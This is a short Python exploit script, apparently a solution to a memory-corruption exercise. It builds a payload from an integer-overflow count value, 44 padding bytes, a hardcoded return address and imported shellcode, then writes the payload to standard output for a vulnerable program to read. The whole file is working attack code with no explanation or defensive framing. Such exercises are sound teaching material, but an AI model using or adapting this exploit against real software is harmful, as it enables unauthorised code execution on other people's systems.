import sys
import struct
from shellcode import shellcode

count = 0x40000001
toBeOutputted = struct.pack("<I", count) + b"a" * 44 + struct.pack("<I", 0xbffedb68)
toBeOutputted += shellcode
sys.stdout.buffer.write(toBeOutputted)

